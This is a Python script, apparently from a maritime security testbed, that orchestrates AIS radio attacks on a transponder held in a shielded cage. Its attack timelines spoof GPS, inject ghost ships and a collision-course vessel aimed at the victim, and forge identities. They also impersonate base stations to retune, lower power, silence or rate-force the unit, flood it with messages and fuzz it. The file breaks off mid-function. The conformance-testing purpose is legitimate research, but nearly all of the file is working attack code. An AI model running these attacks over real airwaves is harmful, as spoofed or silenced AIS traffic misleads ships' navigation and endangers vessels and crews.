#!/usr/bin/env python3
r"""
rf_session.py -- run a full attack SESSION against a transponder: feed it GPS
continuously (so it has a fix and transmits), fire a timeline of AIS attacks over the
ais-simulator websocket, and log everything to one timestamped manifest so the separate
VHF and serial recordings can be aligned afterward.

Why this exists: some attacks only make sense when the SDR injection is aligned with the
transponder's own position (collision course must aim at where the victim actually is).
This orchestrator holds the victim's simulated GPS position and lets position-aware
attacks read it, so everything is synced. Fire-and-forget attacks (commands, fuzzing)
run on the same timeline for one clean, richly-populated capture.

** SAFETY ** transmits AIS -> cage sealed only. Requires the cage-sealed confirmation.

Setup (all cage sealed):
  listener Pi:     ./record_ais.sh                       # VHF witness
  transponder Pi:  python3 record_serial.py --port ... --baud 38400   # serial witness
  attacker Pi:     python3 -u ais-simulator.py --channel B -l 20      # tx backend
  attacker Pi:     python3 rf_session.py --gps-port /dev/ttyUSB0 \
                       --victim-mmsi 677777777 --lat 42.35 --lon -70.90

The GPS feed and the attack timeline both run from THIS script. The victim transponder
gets GPS on --gps-port; attacks go out the websocket to ais-simulator.

Requires: pyserial, pynmea2, websocket-client.
"""
import argparse, json, math, os, sys, threading, time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import ais_encode as enc
import ais_encode_p3 as p3enc
try:
    import websocket
except Exception:
    websocket = None
try:
    import serial, pynmea2
    from datetime import datetime, timezone
except Exception:
    serial = None


# ----------------------------------------------------------------------------
# GPS feed (background thread) -- keeps the victim transponder at a live position
# ----------------------------------------------------------------------------
class GpsFeed(threading.Thread):
    """Continuously send GGA+RMC+VTG for the current position to the transponder.
    The position is mutable so the timeline can move the victim if desired."""
    def __init__(self, port, baud, lat, lon, alt=10.0, speed=0.0, course=0.0, rate=1.0):
        super().__init__(daemon=True)
        self.port, self.baud, self.rate = port, baud, rate
        self.lat, self.lon, self.alt = lat, lon, alt
        self.speed, self.course = speed, course
        self._stop = threading.Event()
        self.ser = None
        self._wlock = threading.Lock()   # serialize writes so an injected sentence never
                                         # interleaves mid-sentence with the baseline feed

    def _sentences(self):
        now = datetime.now(timezone.utc)
        t = now.strftime("%H%M%S.00"); d = now.strftime("%d%m%y")
        def nm(deg, is_lat):
            hemi = ('N' if deg >= 0 else 'S') if is_lat else ('E' if deg >= 0 else 'W')
            deg = abs(deg); dd = int(deg); m = (deg-dd)*60
            return (f"{dd:02d}{m:07.4f}" if is_lat else f"{dd:03d}{m:07.4f}"), hemi
        la, lah = nm(self.lat, True); lo, loh = nm(self.lon, False)
        gga = pynmea2.GGA('GP','GGA',(t,la,lah,lo,loh,'1','08','0.9',
                                      f"{self.alt:.1f}",'M','0.0','M','',''))
        rmc = pynmea2.RMC('GP','RMC',(t,'A',la,lah,lo,loh,f"{self.speed:.1f}",
                                      f"{self.course:.1f}",d,'','','A'))
        vtg = pynmea2.VTG('GP','VTG',(f"{self.course:.1f}",'T','','M',
                                      f"{self.speed:.1f}",'N',f"{self.speed*1.852:.1f}",'K','A'))
        # HDT (true heading, from a heading device 'HE') and ZDA (explicit UTC date/time) are
        # added so the unit stops raising "Heading lost/inv" and "UTC sync invalid" alarms -- in
        # the em-trak run those swamped the alert channel and hid any attack-specific alarm.
        # (A "No valid COG" alarm is separate: it clears once the victim has a nonzero SOG.)
        hdt = pynmea2.HDT('HE','HDT',(f"{self.course:.1f}",'T'))
        zda = pynmea2.ZDA('GP','ZDA',(t, now.strftime('%d'), now.strftime('%m'),
                                      now.strftime('%Y'), '00', '00'))
        return (gga, rmc, vtg, hdt, zda)

    def run(self):
        self.ser = serial.Serial(self.port, self.baud, timeout=1)
        while not self._stop.is_set():
            for s in self._sentences():
                try:
                    with self._wlock:
                        self.ser.write((str(s) + "\r\n").encode())
                except Exception:
                    pass
            time.sleep(self.rate)
        self.ser.close()

    def inject_raw(self, data):
        """Write raw bytes (a malformed / crafted sentence) onto the same serial line the
        baseline GPS feed uses, without corrupting a baseline sentence in flight. `data`
        may be str or bytes. Used by the serial extras (multi-sentence reassembly, config
        command). Detection is offline from the transponder's output capture."""
        if self.ser is None:
            return
        if isinstance(data, str):
            data = data.encode("latin-1", "replace")
        try:
            with self._wlock:
                self.ser.write(data)
                self.ser.flush()
        except Exception:
            pass

    def set_position(self, lat, lon, speed=None, course=None):
        self.lat, self.lon = lat, lon
        if speed is not None: self.speed = speed
        if course is not None: self.course = course

    def stop(self):
        self._stop.set()


# ----------------------------------------------------------------------------
# helpers to aim position-aware attacks at the victim
# ----------------------------------------------------------------------------
def offset_position(lat, lon, bearing_deg, dist_m):
    """Point dist_m from (lat,lon) along bearing (flat-earth, fine for cage-scale)."""
    b = math.radians(bearing_deg)
    dlat = (dist_m * math.cos(b)) / 111320.0
    dlon = (dist_m * math.sin(b)) / (111320.0 * math.cos(math.radians(lat)))
    return lat + dlat, lon + dlon


# ----------------------------------------------------------------------------
# The attack timeline. Each entry: (name, builder) where builder(ctx) -> list of
# (payload_bits, meta). ctx gives access to the live victim position + config.
# Position-aware builders read ctx.victim_lat/lon; others ignore it.
# ----------------------------------------------------------------------------
class Ctx:
    def __init__(self, victim_mmsi, gps):
        self.victim_mmsi = victim_mmsi
        self.gps = gps
    @property
    def victim_lat(self): return self.gps.lat
    @property
    def victim_lon(self): return self.gps.lon


def build_timeline(ctx):
    V = ctx.victim_mmsi
    vlat, vlon = ctx.victim_lat, ctx.victim_lon
    tl = []

    # --- position spoofs (some aimed at the victim) ---
    tl.append(("ghost_ship",
        [(enc.encode_type1(366000001, vlat + 0.02, vlon + 0.02, sog=0.0),
          "ghost near victim")]))
    tl.append(("impossible_jump",
        [(enc.encode_type1(366000002, vlat, vlon), "jump A at victim"),
         (enc.encode_type1(366000002, vlat + 0.3, vlon + 0.3), "jump B far")]))
    tl.append(("impossible_speed",
        [(enc.encode_type1(366000003, vlat, vlon, sog=102.0, cog=90.0),
          "102kn at victim")]))
    tl.append(("collision_course",
        # a vessel 0.05 deg NORTH of the victim, heading SOUTH (180) toward it at 20kn
        [(enc.encode_type1(366000010, *offset_position(vlat, vlon, 0, 5000),
                           sog=20.0, cog=180.0), "attacker N of victim, heading S")]))
    tl.append(("fake_identity_sar",
        [(enc.encode_type1(111000001, vlat, vlon), "SAR-prefix at victim")]))
    tl.append(("rapid_ghost_fleet",
        [(enc.encode_type1(366100000 + i, vlat + 0.01*i, vlon + 0.01*(i % 3), sog=5.0),
          f"fleet {i}") for i in range(6)]))

    # --- own-MMSI echo: transmit a Type 1 whose SOURCE MMSI is the victim's OWN MMSI, but
    # at a clearly different position (30 km NE) and a distinctive SOG, to test whether the
    # unit misfiles received own-MMSI RF traffic as its OWN data (AIVDO) on the serial
    # presentation port -- i.e. the RF receive path leaking into the own-ship channel.
    # The distinct position is what lets the analyzer separate this from the unit's genuine
    # AIVDO reports of its real (fed) position. A conforming unit should treat it as "other"
    # (AIVDM) or flag an MMSI conflict; emitting AIVDO here would be a real contamination bug.
    tl.append(("own_mmsi_echo",
        [(enc.encode_type1(V, *offset_position(vlat, vlon, 45, 30000), sog=40.0, cog=225.0),
          f"Type1 spoofing the victim's OWN MMSI {V} at a distinct position (30km NE)")]))

    # --- forged static/voyage identity: spoof a vessel's name, call sign, and type.
    # Two variants: (1) a ghost identity, and (2) claiming the VICTIM's own MMSI with a DIFFERENT
    # name/type, to test whether the unit accepts conflicting static data for its own identity.
    # USES TYPE 24 (static data report, Part A + Part B), NOT Type 5. Type 5 is 424 bits (2 TDMA
    # slots); this testbed's SDR injector only reliably transmits single-slot (<=168-bit) bursts
    # -- confirmed empirically: across every run and all three vendors, the independent listener
    # SDR never once decoded a Type-5 sentence during this probe (0/0/0/0/0), while every
    # single-slot message type here transmits and decodes cleanly. That means Type 5 was never
    # actually reaching the air, not that units were rejecting it. Type 24 carries the same
    # forgeable identity fields (name/callsign/type) as two single-slot bursts by design, so it
    # exercises the identical "does the unit accept an unverified identity claim" question through
    # a path this injector already handles correctly.
    tl.append(("forge_static_identity",
        [(enc.encode_type24_a(366000005, shipname="GHOST VESSEL"),
          "M24-A forged ship name for a ghost identity"),
         (enc.encode_type24_b(366000005, callsign="FAKE1", shiptype=70),
          "M24-B forged call sign/type for a ghost identity"),
         (enc.encode_type24_a(V, shipname="NOT REAL NAME"),
          f"M24-A forged ship name claiming the victim's MMSI {V}"),
         (enc.encode_type24_b(V, callsign="SPOOF", shiptype=35),
          f"M24-B forged call sign/type claiming the victim's MMSI {V}")]))

    # --- command / control (addressed to the victim) ---
    tl.append(("interrogation",
        [(enc.encode_type15(366000001, V, msg1_1=5), f"M15 interrogate victim {V}")]))
    tl.append(("interrogation_type3",
        [(enc.encode_type15(366000001, V, msg1_1=3), f"M15 request type3 from {V}")]))
    tl.append(("auto_ack",
        [(enc.encode_type6(366000001, V, dac=1, fid=0, app_data_bits="0"*40),
          f"M6 addressed to victim {V}")]))
    # M16 rate assignment: increment=0, offset=reports/10min (600 = force MAX rate). A Class A
    # takes the HIGHER of assigned vs autonomous, so this forces OVER-reporting, not silence.
    # (phase-1 source is a regular ship with no base announced, so a conforming unit should
    # ignore it -- the base-authority version is tested properly in phase 3.)
    tl.append(("rate_assignment",
        [(enc.encode_type16(366000001, V, offset_a=600, increment_a=0),
          f"M16 force max reporting rate to {V}")]))
    tl.append(("channel_mgmt",
        [(enc.encode_type22(366000001, addressed=1, dest1=V, power=1),
          f"M22 channel/power to {V}")]))
    tl.append(("slot_reservation",
        [(enc.encode_type20(366000001, offset1=0, slots1=5, timeout1=7),
          "M20 reserve 5 slots")]))
    tl.append(("base_vs_regular",
        [(enc.encode_type15(2000000, V, msg1_1=5), "M15 from BASE"),
         (enc.encode_type15(366000001, V, msg1_1=5), "M15 from REGULAR")]))

    # --- broadcast binary ---
    tl.append(("fake_area_notice",
        [(enc.encode_type8(366000001, dac=1, fid=22, app_data_bits="0"*80), "M8 area notice")]))
    tl.append(("fake_met_hydro",
        [(enc.encode_type8(366000001, dac=1, fid=11, app_data_bits="0"*80), "M8 met/hydro")]))

    # --- protocol fuzzing / malformed ---
    tl.append(("reserved_values",
        [(enc.encode_type1_raw(366000001, vlat, vlon, sog_u=1023, nav_status=13,
                               cog_u=4000, heading=511), "nav13/sog1023/cog4000")]))
    tl.append(("sentinels_misused",
        [(enc.encode_type1_raw(366000001, 91.0, 181.0), "lat91/lon181")]))
    tl.append(("spare_bits_nonzero",
        [(enc.encode_type1_raw(366000001, vlat, vlon, spare=7), "spare=7")]))
    tl.append(("undefined_msg_type",
        [(enc.encode_undefined_type(28, 366000001), "type 28")]))
    tl.append(("truncated_msg",
        [(enc.make_truncated(enc.encode_type1(366000001, vlat, vlon), 80), "truncated 80b")]))
    tl.append(("oversized_msg",
        [(enc.make_oversized(enc.encode_type1(366000001, vlat, vlon), 40), "oversized +40b")]))

    return tl


# Phase 2: the aggressive / potentially-disruptive tests, severity-ordered.
# These run AFTER phase 1, each with a large gap, because they may reconfigure or
# disrupt the transponder. BASE_STATION source MMSI tests source authority.
#
# A properly-formed AIS base station MMSI has the format 00MIDXXXX: two leading zeros,
# then a valid 3-digit maritime ID (MID), then four digits. 003669999 uses MID 366
# (United States), so it is a spec-valid base station identity. The earlier value
# (2000000 -> padded 002000000) used MID 200, which is not an allocated MID, so a unit
# that validates the MID could reject it for that reason alone. Using a valid-MID base
# station removes that confound when testing whether a unit honors base-station commands.
BASE_MMSI = 3669999              # -> 003669999 : valid base station (00 + US MID 366)
REGULAR_MMSI = 366000001         # a regular Class-A ship-station MMSI (MID 366)
AIS_CH_A, AIS_CH_B = 2087, 2088  # normal AIS channel numbers
NON_AIS_CH = 2001                # a marine VHF channel well outside the AIS band

def build_phase2(ctx):
    V = ctx.victim_mmsi
    vlat, vlon = ctx.victim_lat, ctx.victim_lon
    p2 = []

    # ENCODER CHOICE: well-formed management commands and every RECOVERY go through the
    # pyais-validated p3enc (single validated code path, and a recovery that is guaranteed
    # spec-correct so a successful retune is always reversible). The frequency sweep below
    # deliberately targets out-of-range channel numbers (0, 4095) that a spec-strict encoder
    # refuses to emit, so it must use the hand-rolled enc.encode_type22 -- which now frames
    # the addressed flag correctly (bit 139) after the ais_encode.py fix, verified by its
    # pyais round-trip self-test.

    # 1) power mode change, sent AS A BASE STATION (source-authority test)
    p2.append(("p2_power_as_base",
        [(p3enc.m22_channel(BASE_MMSI, V, channel_a=AIS_CH_A, channel_b=AIS_CH_B, power=1),
          "M22 from BASE: set DY to LOW power")]))

    # 2) switch AIS channels (tell DY to swap A/B) from a base station
    p2.append(("p2_channel_swap",
        [(p3enc.m22_channel(BASE_MMSI, V, channel_a=AIS_CH_B, channel_b=AIS_CH_A),
          "M22 from BASE: swap DY channels A<->B")]))

    # 3) FREQUENCY SWEEP: try to move DY to several different channels, from a base
    #    station. After EACH attempt, send a recovery M22 putting DY back on the normal
    #    AIS channels, so that if one target works it does not silence all later tests.
    #    Targets span: adjacent marine channels, channels progressively further from the
    #    AIS band, and edge/invalid channel numbers. This finds WHICH (if any) DY accepts.
    #    NOTE: this returns MULTIPLE named entries so each is logged and gapped separately.
    #    They are appended here and handled as individual timeline items.
    sweep_targets = [
        (2088, "AIS2 162.025 (control: legal target)"),
        (2087, "AIS1 161.975 (control: legal target)"),
        (2086, "ch 86 ~161.925 (adjacent, just below AIS)"),
        (2001, "ch 1 ~156.05 (far below AIS band)"),
        (2028, "ch 28 ~162.00-ish region"),
        (2078, "ch 78 (near-band marine)"),
        (0,    "channel 0 (invalid/edge)"),
        (4095, "channel 4095 (max 12-bit, invalid)"),
    ]
    for chan, label in sweep_targets:
        # retune target uses the permissive encoder (must be able to emit invalid channels)
        p2.append((f"p2_retune_ch{chan}",
            [(enc.encode_type22(BASE_MMSI, channel_a=chan, channel_b=chan,
                                addressed=1, dest1=V),
              f"M22 from BASE: retune DY to channel {chan} [{label}]")]))
        # recovery uses the pyais-validated encoder so restoring the unit never depends
        # on the hand-rolled path being correct
        p2.append((f"p2_recover_after_ch{chan}",
            [(p3enc.m22_channel(BASE_MMSI, V, channel_a=AIS_CH_A, channel_b=AIS_CH_B),
              "M22 from BASE: RECOVERY -> restore DY to AIS channels 2087/2088")]))

    # 4) force MAX reporting rate. NOTE: a Class A takes the HIGHER of assigned vs autonomous
    #    rate (M.1371-5 Table 67), so M16 cannot SILENCE a Class A -- it can only force it to
    #    OVER-report. Assigning 600 reports/10 min to an otherwise-slow (anchored) unit is the
    #    observable, abusable effect (airtime/slot consumption). The old test tried to assign a
    #    slow rate (which the unit correctly ignores) with an invalid increment (also ignored).
    p2.append(("p2_force_fast_rate",
        [(p3enc.m16_rate_assignment(BASE_MMSI, V, 600),
          "M16 from BASE: force MAX reporting rate (600/10min) -> over-report")]))

    # 4b) SOLAS speed-vs-rate VIOLATION: the victim is driven FAST (main sets its SOG high), so
    #    M.1371 autonomous rate should be ~2s. We then assign the SLOWEST rate (20/10min = 1 per
    #    30s). A conformant unit takes the HIGHER (autonomous fast) rate and ignores this; a unit
    #    that obeys it under-reports a fast-moving vessel -> the ship appears at stale, jumpy
    #    positions to others (a real SOLAS reporting violation).
    p2.append(("p2_slow_rate_while_fast",
        [(p3enc.m16_rate_assignment(BASE_MMSI, V, 20),
          "M16 from BASE: assign SLOW rate (1/30s) while victim moves FAST -> SOLAS violation")]))

    # 4c) BEYOND-SPEC rate values (a conformant unit clamps these): rate 0 (silence?) and a rate
    #    past the 600 maximum. Obeying an out-of-range value is itself a finding.
    p2.append(("p2_rate_zero",
        [(p3enc.m16_rate_raw(BASE_MMSI, V, 0),
          "M16 from BASE: rate=0 reports/10min (beyond-spec -> silence?)")]))
    p2.append(("p2_rate_overmax",
        [(p3enc.m16_rate_raw(BASE_MMSI, V, 1000),
          "M16 from BASE: rate=1000/10min (beyond the 600 max, beyond-spec)")]))

    # 5) timing / slot overload -- reserve large slot blocks (FATDMA hogging). Distinctive,
    #    patterned reservations so a comm-state shift in the victim's reports is attributable.
    p2.append(("p2_slot_overload",
        [(p3enc.m20_datalink(BASE_MMSI, offset=0, number=15, timeout=7, increment=0),
          "M20 from BASE: reserve 15 slots (max block)"),
         (p3enc.m20_datalink(BASE_MMSI, offset=200, number=15, timeout=7),
          "M20 from BASE: reserve 15 more slots")]))
    p2.append(("p2_slot_overload",
        [(p3enc.m20_datalink(BASE_MMSI, offset=0, number=15, timeout=7, increment=0),
          "M20 from BASE: reserve 15 slots (max block)"),
         (p3enc.m20_datalink(BASE_MMSI, offset=200, number=15, timeout=7),
          "M20 from BASE: reserve 15 more slots")]))

    # 6) TDMA disruption via injected M1 with manipulated comm-state claiming slots,
    #    high-rate, to induce collisions with DY's own transmissions.
    p2.append(("p2_tdma_collision_flood",
        [(enc.encode_type1(366000900 + i, vlat, vlon, sog=0.0), f"collision flood {i}")
         for i in range(8)]))

    # ESTABLISH THE BASE STATION. Management messages (M16/M20/M22) are base-station functions;
    # ITU-R M.1371-5 says a Message 20 "without a base station report (Message 4) should be
    # ignored", and the assignment/channel-management functions likewise expect an established
    # base. So we prefix every management cell with Message 4 bursts announcing BASE_MMSI as a
    # real base at the victim's location. Without this the earlier run's channel/rate/slot
    # commands were correctly ignored -- a test artifact, not unit behavior. The TDMA flood is
    # ordinary Type-1 traffic and needs no base context.
    m4 = (p3enc.m4_base_report(BASE_MMSI, vlat, vlon), "M4: announce base station")
    p2 = [(n, ([m4, m4] + pl) if "tdma" not in n else pl) for (n, pl) in p2]

    return p2


# Phase 3: SOURCE-AUTHORITY MATRIX (corrected against ITU-R M.1371-5).
#
# The management messages (assignment M16, data-link M20, channel management M22) are
# BASE-STATION functions. The spec states a Message 20 received "without a base station
# report (Message 4) should be ignored", and M16/M22 likewise operate within an established
# base's cell. So this phase FIRST announces a real base station (Message 4 from BASE_MMSI at
# the victim's location) and keeps it present in every management cell, THEN issues the
# command. The source-authority question is then clean: with a legitimate base present, does
# the unit act on the same command from the BASE vs from a REGULAR ship? A conforming unit
# obeys only the base; one that also obeys the regular ship fails the check.
#   (Without the M4 the earlier run's M16/M20/M22 were correctly ignored -- a test artifact,
#    not a real "ignores base commands" result.)
#
# Interrogation (M15) and addressed binary (M6) are handled SEPARATELY: the spec REQUIRES a
# unit to answer M15 (Sec 4.3.3.3.3: "should automatically respond ... from an AIS station")
# and to acknowledge M6 (transport layer) from ANY source. A response there is spec-COMPLIANT
# -- the finding is forced-response / amplification, not a source-authority failure. They
# carry no M4 and the analyzer buckets them apart.
#
# M16 semantics (Table 67): a Class A takes the HIGHER of the assigned and autonomous rate, so
# M16 can only force FASTER reporting. We assign the MAX rate (600/10 min); "success" = the
# unit's transmit rate jumps above baseline. (Assigning a slow rate, as the old test did, is
# correctly ignored -- and the old increment=1000 was an undefined code, ignored regardless.)
def build_phase3(ctx):
    V = ctx.victim_mmsi
    blat, blon = ctx.victim_lat, ctx.victim_lon
    m4 = (p3enc.m4_base_report(BASE_MMSI, blat, blon), "M4: announce base station")
    cells = []

    # (A) SOURCE-AUTHORITY: real management commands, base announced (M4) throughout each cell
    mgmt = [
        ("M16_rate_fast",
         lambda src: p3enc.m16_rate_assignment(src, V, 600),
         "M16 force MAX reporting rate (600/10min)"),
        ("M20_slot_reservation",
         lambda src: p3enc.m20_datalink(src, offset=100, number=10, timeout=7),
         "M20 reserve 10 slots"),
        ("M22_channel_mgmt",
         lambda src: p3enc.m22_channel(src, V, channel_a=AIS_CH_B, channel_b=AIS_CH_A),
         "M22 swap victim channels A<->B"),
        ("M22_power_low",
         lambda src: p3enc.m22_channel(src, V, channel_a=AIS_CH_A, channel_b=AIS_CH_B, power=1),
         "M22 set victim to LOW power"),
    ]
    for label, builder, meta in mgmt:
        cells.append((f"p3_{label}_base",
                      [m4, m4, (builder(BASE_MMSI), f"[SRC=BASE {BASE_MMSI:07d}] {meta}")]))
        cells.append((f"p3_{label}_regular",
                      [m4, m4, (builder(REGULAR_MMSI), f"[SRC=REGULAR {REGULAR_MMSI}] {meta}")]))
        if label.startswith("M22") or label.startswith("M16"):
            cells.append((f"p3_recover_after_{label}",
                          [m4,
                           (p3enc.m22_channel(BASE_MMSI, V, channel_a=AIS_CH_A,
                                              channel_b=AIS_CH_B, power=0),
                            "RECOVERY: restore AIS channels + high power"),
                           (p3enc.m16_rate_assignment(BASE_MMSI, V, 20),
                            "RECOVERY: release rate (autonomous wins; self-times-out)")]))

    # (B) MANDATORY-RESPONSE: responding is spec-required from ANY source -- not authority.
    #     Kept for the amplification/forced-response finding; no M4 (they need no base context).
    respond = [
        ("M15_interrogation",
         lambda src: p3enc.m15_interrogation(src, V, req_type=5),
         "M15 interrogate victim (response is MANDATORY per spec)"),
        ("M6_addressed_ack",
         lambda src: p3enc.m6_addressed(src, V, dac=1, fid=0),
         "M6 addressed binary (ack is MANDATORY per spec)"),
    ]
    for label, builder, meta in respond:
        cells.append((f"p3_{label}_base",
                      [(builder(BASE_MMSI), f"[SRC=BASE {BASE_MMSI:07d}] {meta}")]))
        cells.append((f"p3_{label}_regular",
                      [(builder(REGULAR_MMSI), f"[SRC=REGULAR {REGULAR_MMSI}] {meta}")]))

    return cells


# ---- M20 slot-reservation suite (focused, re-runnable without the full session) ----------
# The single 10-slot reservation in phase 3 is too small to force a visible squeeze, so its
# effect can't be separated from ordinary SOTDMA slot churn. This suite sweeps the RESERVATION
# DENSITY: the M20 "number of slots" field is only ~4 bits (<=15), so a large fraction of the
# frame is reserved by REPEATING the block via the `increment` field (reserve `number` slots
# every `increment` slots). A unit that honors M20 must vacate an increasing share of the frame,
# which shows up as rising slot reselection / spread; one that ignores it stays flat as density
# climbs. Each reservation cell is followed by a clean control cell (base announced, no
# reservation) so the analyzer has a traffic-matched baseline right beside each test.
def build_m20_suite(ctx):
    V = ctx.victim_mmsi
    blat, blon = ctx.victim_lat, ctx.victim_lon
    m4 = (p3enc.m4_base_report(BASE_MMSI, blat, blon), "M4: announce base station")
    clean = (p3enc.m4_base_report(BASE_MMSI, blat, blon), "clean control: base announced, no reservation")
    # (source, label, kwargs, human) -- density sweep from base, plus one dense from a regular ship
    plan = [
        ("base",    "small",     dict(offset=100, number=10, timeout=7, increment=0),  "10 slots, single block (~0.4% of frame)"),
        ("base",    "half",      dict(offset=0,   number=10, timeout=7, increment=20), "10 of every 20 slots (~50% of frame)"),
        ("base",    "dense",     dict(offset=0,   number=10, timeout=7, increment=15), "10 of every 15 slots (~67% of frame)"),
        ("base",    "verydense", dict(offset=0,   number=15, timeout=7, increment=20), "15 of every 20 slots (~75% of frame)"),
        ("regular", "dense",     dict(offset=0,   number=10, timeout=7, increment=15), "10 of every 15 slots (~67% of frame)"),
    ]
    src_mmsi = {"base": BASE_MMSI, "regular": REGULAR_MMSI}
    cells = []
    for src, label, kw, human in plan:
        cells.append((f"m20_{src}_{label}",
                      [m4, m4, (p3enc.m20_datalink(src_mmsi[src], **kw),
                                f"[SRC={src.upper()}] M20 reserve {human}")]))
        cells.append((f"m20_recover_after_{src}_{label}", [m4, clean]))
    return cells


# ----------------------------------------------------------------------------
# EXTRAS: new probes for the A/B invariants surfaced by the spec analysis.
# RF probes returned as (name, [(bits, meta), ...]) like the other timelines;
# serial probes returned by build_serial_extras().
# ----------------------------------------------------------------------------
GHOST_A     = 366000050
GHOST_DUP   = 366000070
FAKE_BASE   = 366000060          # ship-format MMSI masquerading as a base station
SAR_PREFIX  = 970000123          # AIS-SART reserved prefix (970)
SHIP_AS_SAR = 366000009          # ordinary ship MMSI sending a SAR (Msg 9) report


def build_extras(ctx):
    V = ctx.victim_mmsi
    vlat, vlon = ctx.victim_lat, ctx.victim_lon
    ex = []

    # INV-A-RECV-09: M20 slot reservation with NO base (Msg 4) announced -> should be ignored.
    ex.append(("x_m20_no_base",
        [(enc.encode_type20(REGULAR_MMSI, offset1=100, slots1=10, timeout1=7),
          "M20 reserve 10 slots from an ordinary ship, no base announced")]))

    # INV-B-AUTH-02: fake base-station report (Msg 4) from a ship-format MMSI, false time/pos.
    ex.append(("x_fake_base_report",
        [(enc.encode_type4(FAKE_BASE, vlat + 1.0, vlon + 1.0, hour=12, minute=34, second=56),
          "Msg4 base announcement from a SHIP MMSI, false UTC + position")]))

    # INV-B-AUTH-02: false DGNSS corrections (Msg 17) from an ordinary MMSI.
    ex.append(("x_false_dgnss",
        [(enc.encode_type17(REGULAR_MMSI, vlat, vlon),
          "Msg17 DGNSS corrections from an ordinary ship (bogus payload)")]))

    # Forged identity via Msg 5 (the multi-slot case that never transmitted before).
    # Type 5 is 424 bits / 2 slots; this injector has only ever sent single-slot bursts, so
    # CONFIRM on the witness SDR whether these reach the air. The single-slot Type 24 identity
    # probe still runs in phase 1 as the reliable version.
    ex.append(("x_forge_type5",
        [(enc.encode_type5_static(GHOST_A, callsign="FAKE5", shipname="GHOST TYPE5", shiptype=70),
          "Msg5 forged identity, ghost MMSI (MULTI-SLOT -- verify TX on witness)"),
         (enc.encode_type5_static(V, callsign="SPOOF5", shipname="NOT REAL NAME", shiptype=35),
          f"Msg5 forged identity claiming victim MMSI {V} (MULTI-SLOT)")]))

    # INV-B-PLAUS-02 (replay/appear): a ghost appears now; the identical frame is re-sent at the
    # END of the extras (x_replay_resurrect) after a long gap to test track resurrection.
    gp = offset_position(vlat, vlon, 90, 4000)
    replay_frame = enc.encode_type1(GHOST_A, gp[0], gp[1], sog=6.0, cog=270.0)
    ex.append(("x_replay_appear",
        [(replay_frame, "ghost appears (frame captured for later replay)")]))

    # INV-B-SEM-02: static identity stability -- rapidly overwrite the same MMSI's name.
    ex.append(("x_static_mutate",
        [(enc.encode_type24_a(GHOST_A, shipname="NAME ONE"),   "M24-A name #1"),
         (enc.encode_type24_a(GHOST_A, shipname="NAME TWO"),   "M24-A name #2 (overwrite)"),
         (enc.encode_type24_a(GHOST_A, shipname="NAME THREE"), "M24-A name #3 (overwrite)")]))

    # INV-B-SEM-03: static part binding -- a Part B with no Part A, and mismatched A/B for victim.
    ex.append(("x_static_partial",
        [(enc.encode_type24_b(GHOST_DUP, callsign="ORPHAN", shiptype=70),
          "M24-B only, no Part A ever sent for this MMSI"),
         (enc.encode_type24_a(V, shipname="FAKE FOR VICTIM"),
          f"M24-A claiming victim {V}"),
         (enc.encode_type24_b(V, callsign="MISMTCH", shiptype=52),
          f"M24-B claiming victim {V} with a different vessel class")]))

    # INV-B-AUTH-06: duplicate MMSI at kinematically incompatible positions (~5 NM apart).
    db = offset_position(vlat, vlon, 90, 9260)
    ex.append(("x_duplicate_mmsi",
        [(enc.encode_type1(GHOST_DUP, vlat, vlon, sog=0.0), "duplicate MMSI at position A"),
         (enc.encode_type1(GHOST_DUP, db[0], db[1], sog=0.0), "same MMSI ~5NM away (impossible)")]))

    # INV-B-AUTH-04: distress state without a distress identity, and its converse.
    ex.append(("x_distress_state_ordinary",
        [(enc.encode_type1_raw(REGULAR_MMSI, vlat, vlon, nav_status=14),
          "nav-status 14 (AIS-SART active) from an ORDINARY ship MMSI")]))
    ex.append(("x_distress_id_normal",
        [(enc.encode_type1(SAR_PREFIX, vlat, vlon, sog=8.0, nav_status=0),
          "970-prefix (AIS-SART) MMSI reporting NORMAL underway status")]))

    # INV-B-AUTH-03: station-class enforcement -- Msg 9 (SAR aircraft) from an ordinary ship.
    ex.append(("x_msg9_from_ship",
        [(enc.encode_type9(SHIP_AS_SAR, vlat, vlon, sog=200.0, cog=90.0, altitude=500),
          "Msg9 SAR-aircraft report sent from an ordinary ship MMSI")]))

    # INV-B-PLAUS-03: interrogation flood -- force repeated responses on demand.
    ex.append(("x_interrogation_flood",
        [(enc.encode_type15(REGULAR_MMSI, V, msg1_1=5), f"M15 interrogate {V} (#{k})")
         for k in range(6)]))

    # INV-B-PLAUS-02 (resurrect): replay the exact earlier ghost frame after the long extras gap.
    ex.append(("x_replay_resurrect",
        [(replay_frame, "replay the identical ghost frame -> does the stopped track return?")]))

    return ex


def _m22_regional(src, vlat, vlon, ch_a, ch_b, power=0, tx_rx=0):
    """A spec-valid BROADCAST regional Msg 22 whose region contains the victim, commanding
    channels ch_a/ch_b. Per IEC 61993-2 17.2/17.7 a unit applies a regional channel setting
    when it is inside the defined area, so this is the correctly-formatted form the earlier
    addressed test was missing. `power`=1 commands LOW power; `tx_rx` selects the Tx/Rx mode
    (0 = Tx+Rx on both channels; 1 = Tx on channel A only; 2 = Tx on channel B only)."""
    ne_lat = int(round((vlat + 1.0) * 600)); ne_lon = int(round((vlon + 1.0) * 600))
    sw_lat = int(round((vlat - 1.0) * 600)); sw_lon = int(round((vlon - 1.0) * 600))
    return enc.encode_type22(src, channel_a=ch_a, channel_b=ch_b, tx_rx=tx_rx, power=power,
                             ne_lon=ne_lon, ne_lat=ne_lat, sw_lon=sw_lon, sw_lat=sw_lat,
                             addressed=0, zonesize=3)


def _m23_group(src, vlat, vlon, station_type=0, ship_type=0, tx_rx=0, interval=0, quiet=0):
    """A spec-valid BROADCAST Msg 23 group-assignment command whose region contains the victim.
    Msg 23 is a base-station function that reconfigures every station in a geographic region that
    matches a station-type / ship-type filter (0/0 = all). `interval` sets a slower reporting
    interval (0 = default, larger = slower); `quiet` sets a quiet time in minutes (0 = none,
    1-15 = go silent for that many minutes) -- a direct region-wide silence lever. 160 bits;
    verified to round-trip through pyais (msg_type 23, region + fields intact)."""
    ne_lat = int(round((vlat + 1.0) * 600)); ne_lon = int(round((vlon + 1.0) * 600))
    sw_lat = int(round((vlat - 1.0) * 600)); sw_lon = int(round((vlon - 1.0) * 600))
    b  = enc._bits(23, 6) + enc._bits(0, 2) + enc._bits(src, 30) + enc._bits(0, 2)
    b += enc._bits(ne_lon, 18) + enc._bits(ne_lat, 17)
    b += enc._bits(sw_lon, 18) + enc._bits(sw_lat, 17)
    b += enc._bits(station_type, 4) + enc._bits(ship_type, 8) + enc._bits(0, 22)
